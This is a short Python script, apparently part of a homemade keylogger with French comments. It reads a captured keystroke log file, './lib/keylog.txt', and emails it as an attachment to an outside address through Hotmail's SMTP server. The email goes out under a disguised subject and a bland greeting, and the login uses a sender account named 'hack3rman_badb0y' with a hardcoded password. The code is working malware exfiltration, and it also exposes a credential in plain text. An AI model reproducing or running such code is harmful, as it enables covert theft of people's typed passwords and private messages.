import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
import logging

# ------------------------------ envoi de mail
try:
    to =  "jerome.arn@ik.me"
    print("Mail envoyé à " + to)
    time.sleep(10)
    # expediteur
    user = "hack3rman_badb0y@hotmail.com"
    # mdp
    password = "zkyKMR%M@koaCBV%E4#i*LA8"

    msg = MIMEMultipart()
    file = "./lib/keylog.txt"
    attachment = open(file,'rb')
    obj = MIMEBase('application','octet-stream')
    obj.set_payload((attachment).read())
    encoders.encode_base64(obj)
    obj.add_header('Content-Disposition',"attachment; filename= "+file)
    msg.attach(obj)

    msg["From"] = user
    msg["To"] = to
    msg["Subject"] = "file you need"
    html = """\
    <html>
      <body>
        <p>Hi,<br>
           How are you?<br>
        </p>
      </body>
    </html>
    """

    # msg.attach(MIMEText(body, "plain"))  # regarder pourquoi "plain"
    msg.attach(MIMEText(html, 'html'))

    ms = smtplib.SMTP('smtp.live.com', 587)
    ms.ehlo()
    ms.starttls()
    ms.login(user, password)
    ms.sendmail(user, to, msg.as_string())
    ms.quit()
except smtplib.SMTPRecipientsRefused:
    print("L'adresse " + to + " n'est pas valide !!!!!!!!!!!!!!!!!!")
